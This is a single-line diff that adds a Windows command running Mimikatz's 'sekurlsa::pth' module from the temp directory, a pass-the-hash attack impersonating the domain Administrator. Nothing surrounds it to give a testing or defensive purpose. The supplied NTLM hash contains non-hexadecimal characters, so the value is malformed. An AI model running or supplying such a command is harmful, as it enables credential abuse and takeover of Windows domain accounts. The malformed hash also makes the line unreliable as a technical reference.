@@ -1,0 +1,1 @@
+%tmp%\mimikatz\x64\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a"
